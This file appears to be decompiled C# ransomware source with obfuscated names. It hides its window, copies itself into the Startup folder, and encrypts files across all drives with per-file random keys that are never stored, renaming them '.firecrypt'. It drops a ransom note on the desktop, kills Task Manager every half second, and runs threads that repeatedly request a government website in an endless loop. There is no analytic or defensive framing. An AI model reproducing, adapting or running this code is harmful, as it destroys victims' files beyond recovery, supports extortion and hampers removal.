using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class ZUJdULYiSRFqSoB
{
	private const int SW_HIDE = 0;

	private static ResourceManager rm = new ResourceManager("Library", typeof(ZUJdULYiSRFqSoB).Assembly);

	private static System.Timers.Timer HiFEfNeRVuVgasp = new System.Timers.Timer();

	private static int wqJrPyJPLXnDKMV = 1;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetConsoleWindow();

	[STAThread]
	public static void Main()
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		YxNFpXZtWbozUhV();
		HiFEfNeRVuVgasp.AutoReset = true;
		HiFEfNeRVuVgasp.Interval = 500.0;
		HiFEfNeRVuVgasp.Elapsed += MiHyuHXmIvFcXBD;
		HiFEfNeRVuVgasp.Start();
		jDJRGluvtyWdkOb();
		Console.ReadKey();
	}

	private static void YxNFpXZtWbozUhV()
	{
		if (Operators.CompareString(Assembly.GetExecutingAssembly().Location, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup\\pVefdiTMTxLKaeg.exe", false) == 0)
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html"))
			{
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html");
			}
		}
		else
		{
			sNEuISBBooPYkNg();
			PwOzEeSQKcZvRqv();
			MjCOCztLJfPZfbn();
			FFbclJqUjQWpxnT();
		}
	}

	public static void sNEuISBBooPYkNg()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\SysWin32"))
		{
			try
			{
				Directory.CreateDirectory(folderPath + "\\SysWin32");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void PwOzEeSQKcZvRqv()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		try
		{
			File.Copy(location, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup\\pVefdiTMTxLKaeg.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void MiHyuHXmIvFcXBD(object sender, ElapsedEventArgs e)
	{
		Thread thread = new Thread(oZUJdULYiSRFqSo);
		thread.Start();
	}

	private static void FFbclJqUjQWpxnT()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html";
		string @string = rm.GetString("HTML.txt");
		string path2 = folderPath + "\\SysWin32\\files.txt";
		string path3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-filesencrypted.html";
		if (!File.Exists(path))
		{
			try
			{
				using StreamWriter streamWriter = File.CreateText(path);
				streamWriter.WriteLine(@string);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			OPNSDvDhItKNQIh();
		}
		StreamReader streamReader = new StreamReader(path2);
		if (!File.Exists(path3))
		{
			try
			{
				using StreamWriter streamWriter2 = File.CreateText(path3);
				while (streamReader.Peek() >= 0)
				{
					streamWriter2.WriteLine(streamReader.ReadLine() + "<br>");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		streamReader.Close();
	}

	private static void OPNSDvDhItKNQIh()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string userName = Environment.UserName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html";
		object obj = File.ReadAllLines(folderPath + "\\SysWin32\\files.txt").Length;
		string newValue = "55555";
		string newValue2 = "123@gmail.com";
		string newValue3 = userName + "-" + egYxNFpXZtWbozU(10);
		if (File.Exists(path))
		{
			StreamReader streamReader = File.OpenText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html");
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			text = text.Replace("&Date&", Conversions.ToString(DateTime.Today.AddDays(3.0))).Replace("&FileCount&", Conversions.ToString(Operators.ConcatenateObject(obj, (object)" files encrypted securely."))).Replace("&bitwallet&", newValue)
				.Replace("#link#", "./VgaspMiHyuHXmIv-filesencrypted.html")
				.Replace("&email&", newValue2)
				.Replace("&UserID&", newValue3);
			StreamWriter streamWriter = File.CreateText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\VgaspMiHyuHXmIv-READ_ME.html");
			streamWriter.WriteLine(text);
			streamWriter.Close();
		}
	}

	public static void MjCOCztLJfPZfbn()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				if (driveInfo.IsReady)
				{
					hVHiFEfNeRVuVga(driveInfo.Name);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void KoZUJdULYiSRFqS(string nrGCkyXYyIUwQuT, List<string> lLlwqJrPyJPLXnD)
	{
		foreach (string item in from s in Directory.GetFiles(nrGCkyXYyIUwQuT, "*.*")
			where (s.EndsWith(".txt") || s.EndsWith(".jpg") || s.EndsWith(".png") || s.EndsWith(".doc") || s.EndsWith(".docx") || s.EndsWith(".csv") || s.EndsWith(".sql") || s.EndsWith(".mdb") || s.EndsWith(".sln") || s.EndsWith(".php") || s.EndsWith(".asp") || s.EndsWith(".aspx") || s.EndsWith(".html") || s.EndsWith(".htm") || s.EndsWith(".csx") || s.EndsWith(".psd") || s.EndsWith(".aep") || s.EndsWith(".mp3") || s.EndsWith(".pdf") || s.EndsWith(".torrent")) ? true : false
			select s)
		{
			lLlwqJrPyJPLXnD.Add(item);
		}
		string[] directories = Directory.GetDirectories(nrGCkyXYyIUwQuT);
		foreach (string nrGCkyXYyIUwQuT2 in directories)
		{
			try
			{
				KoZUJdULYiSRFqS(nrGCkyXYyIUwQuT2, lLlwqJrPyJPLXnD);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] oBPwOzEeSQKcZvR(byte[] WEsNEuISBBooPYk, byte[] NgMjCOCztLJfPZf)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			object obj = new Rfc2898DeriveBytes(NgMjCOCztLJfPZf, salt, 1000);
			rijndaelManaged.Key = (byte[])NewLateBinding.LateGet(obj, (Type)null, "GetBytes", new object[1] { (double)rijndaelManaged.KeySize / 8.0 }, (string[])null, (Type[])null, (bool[])null);
			rijndaelManaged.IV = (byte[])NewLateBinding.LateGet(obj, (Type)null, "GetBytes", new object[1] { (double)rijndaelManaged.BlockSize / 8.0 }, (string[])null, (Type[])null, (bool[])null);
			rijndaelManaged.Mode = CipherMode.CBC;
			object obj2 = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				object[] array = new object[3] { WEsNEuISBBooPYk, 0, WEsNEuISBBooPYk.Length };
				bool[] array2 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array, (string[])null, (Type[])null, array2, true);
				if (array2[0])
				{
					WEsNEuISBBooPYk = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			finally
			{
				if (obj2 != null)
				{
					((IDisposable)obj2).Dispose();
				}
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static void qvsEHWrsCMHkzTm(string KaegYxNFpXZtWbo, string zUhVHiFEfNeRVuV)
	{
		byte[] wEsNEuISBBooPYk = File.ReadAllBytes(KaegYxNFpXZtWbo);
		byte[] bytes = Encoding.UTF8.GetBytes(zUhVHiFEfNeRVuV);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = oBPwOzEeSQKcZvR(wEsNEuISBBooPYk, bytes);
		File.WriteAllBytes(KaegYxNFpXZtWbo, bytes2);
		File.Move(KaegYxNFpXZtWbo, KaegYxNFpXZtWbo + Convert.ToString(".firecrypt"));
	}

	public static int GBpVefdiTMTxLKa(RNGCryptoServiceProvider LnrGCkyXYyIUwQu, int TlLlwqJrPyJPLXn)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			LnrGCkyXYyIUwQu.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while ((double)num >= (double)TlLlwqJrPyJPLXn * (2147483647.0 / (double)TlLlwqJrPyJPLXn));
		return num % TlLlwqJrPyJPLXn;
	}

	public static string egYxNFpXZtWbozU(int YWEsNEuISBBooPY)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider lnrGCkyXYyIUwQu = new RNGCryptoServiceProvider())
		{
			while (Math.Max(Interlocked.Decrement(ref YWEsNEuISBBooPY), checked(YWEsNEuISBBooPY + 1)) > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[GBpVefdiTMTxLKa(lnrGCkyXYyIUwQu, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	private static void hVHiFEfNeRVuVga(string targetDirectory)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = folderPath + "\\SysWin32\\files.txt";
		if (!File.Exists(path))
		{
			try
			{
				using StreamWriter streamWriter = File.CreateText(path);
				List<string> list = new List<string>();
				KoZUJdULYiSRFqS(targetDirectory, list);
				list.ToArray();
				foreach (string item in list)
				{
					try
					{
						qvsEHWrsCMHkzTm(item, egYxNFpXZtWbozU(32));
						streamWriter.WriteLine(item);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			using StreamWriter streamWriter2 = File.AppendText(path);
			List<string> list2 = new List<string>();
			KoZUJdULYiSRFqS(targetDirectory, list2);
			list2.ToArray();
			foreach (string item2 in list2)
			{
				try
				{
					qvsEHWrsCMHkzTm(item2, egYxNFpXZtWbozU(32));
					streamWriter2.WriteLine(item2);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private static void oZUJdULYiSRFqSo()
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			try
			{
				process.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void jDJRGluvtyWdkOb()
	{
		try
		{
			Thread thread = new Thread(CkyXYyIUwQuTlLl);
			Thread thread2 = new Thread(CkyXYyIUwQuTlLl);
			Thread thread3 = new Thread(CkyXYyIUwQuTlLl);
			Thread thread4 = new Thread(CkyXYyIUwQuTlLl);
			Thread thread5 = new Thread(CkyXYyIUwQuTlLl);
			thread.Start();
			thread2.Start();
			thread3.Start();
			thread4.Start();
			thread5.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void CkyXYyIUwQuTlLl()
	{
		int num = 0;
		checked
		{
			do
			{
				WebRequest webRequest = WebRequest.Create("http://www.pta.gov.pk/index.php");
				using (WebResponse webResponse = webRequest.GetResponse())
				{
					using StreamReader streamReader = new StreamReader(webResponse.GetResponseStream());
					string contents = streamReader.ReadToEnd();
					File.WriteAllText(Path.GetTempPath() + "\\PNSDvDhItKNQIhK-" + Conversions.ToString(wqJrPyJPLXnDKMV) + ".html", contents);
					wqJrPyJPLXnDKMV++;
				}
				num--;
				num++;
			}
			while (num <= 2);
		}
	}
}
